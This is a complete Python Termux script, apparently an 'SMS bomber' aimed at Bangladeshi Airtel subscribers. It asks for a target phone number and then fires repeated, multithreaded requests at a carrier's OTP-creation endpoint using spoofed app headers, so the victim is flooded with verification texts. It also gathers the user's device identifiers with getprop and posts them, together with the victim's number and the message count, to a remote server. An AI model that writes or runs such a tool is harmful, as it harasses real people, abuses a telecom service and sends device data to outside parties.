#Circle Pin All Device
import os,requests,time,sys,subprocess,json
from requests.structures import CaseInsensitiveDict
from all_file import api
from all_file import banner
from all_file import char as x
from all_file import clear
from all_file import colors
from all_file import randomColor as r
from all_file import device as oparetingSystem
from concurrent.futures import ThreadPoolExecutor as ThreadPool
version = "2.1.8"
url = "https://singleapp.robi.com.bd/api/v1/tokens/create_opt"
headers = CaseInsensitiveDict()
headers["Platform"] = "android"
headers["Appname"] = "airtel"
headers["Deviceid"] = "1117297acfc89586"
headers["Appversion"] = "5.4.3"
headers["Locale"] = "en"
headers["Content-Type"] = "application/x-www-form-urlencoded"

def run():
	try:
		toolsInfo = requests.get("https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/bomber.json").json()
		cpu_id = str(subprocess.check_output("getprop ro.boot.vbmeta.digest",shell=True).decode()).replace("\n","")
		device_brand = subprocess.check_output("getprop ro.product.brand",shell=True).decode().replace("\n","")
		device_model = subprocess.check_output("getprop ro.product.model",shell=True).decode().replace("\n","")
		urlUser = toolsInfo["url"]+"/termux/device-create"
		headers = {
  'Content-Type': 'application/json'
}
		data = json.dumps({
  "cpu_id": cpu_id,
  "device_model": device_model,
  "device_brand": device_brand
})
		userStatus = requests.request("POST", urlUser, headers=headers, data=data).json()
		if userStatus["device_status"] == "active":
			banner.home.bannerPrint(version)
			while True:
				phone = str(input(f"{colors.color.greenBold}    Enter Targert Phone Number {colors.color.cyanBold}[+88]: {colors.color.end}"))
				#protact
				from all_file import protact
				protact.run(phone)
				if len(phone) != 11:
					x.printf.char(colors.color.redBold+"    Please Enter 11Digit Number.",0.01)
				elif phone[:3] != "016":
					x.printf.char(colors.color.redBold+"    Please Enter a airtel number..",0.01)
				elif len(phone) == 11:
					break
			while True:
				amount = int(input(f"{colors.color.greenBold}    Enter SMS Amount [{toolsInfo['smsLimit']}] {colors.color.cyanBold}: {colors.color.end}"))
				if amount <= int(toolsInfo['smsLimit']):
					break
				else:
					x.printf.char(colors.color.redBold+"    Invalid amount..",0.01)
			if toolsInfo["dailyLimit"] == "enabled":
				urlLimit = url + "limit"
				#limit api use and Complete more Task
			else:
				sentOtp(phone,amount,toolsInfo)
				
		else:
			x.printf.char("    "+colors.color.redBold + userStatus['message'],0.01)				
	except requests.exceptions.ConnectionError:
		print("No internet")

def otp(phone):
	data = "msisdn=88"+phone
	try:
		resp = requests.post(url, headers=headers, data=data)
	except requests.exceptions.ConnectionError:
		print("No internet")


def sentOtp(phone,amount,toolsInfo):
	print(f"    {colors.color.greenBold}Total SMS Sent: {colors.color.cyanBold}",end="")
	with ThreadPool(max_workers=100) as attack:
		for i in range(amount):
			attack.submit(otp,phone)
			i+=1
			print_text = "[" + str(i) + "]"
			sys.stdout.write(print_text)
			sys.stdout.flush()
			sys.stdout.write("\b" * len(print_text))
	url = toolsInfo["url"] +"/termux/storeBombingData"
	cpu_id = str(subprocess.check_output("getprop ro.boot.vbmeta.digest",shell=True).decode()).replace("\n","")
	device_brand = subprocess.check_output("getprop ro.product.brand",shell=True).decode().replace("\n","")
	device_model = subprocess.check_output("getprop ro.product.model",shell=True).decode().replace("\n","")
	headers = {
  'Content-Type': 'application/json'
}
	data = json.dumps({
  "cpu_id": cpu_id,
  "device_model": device_model,
  "device_brand": device_brand,
  "name":"Not Found",
  "number‎":"Not Found",
  "victim":phone,
  "amount": amount,
  "method": "airtel 64bit attack."
})
	userStatus = requests.request("POST", url, headers=headers, data=data).json()
	print("["+str(amount)+"]")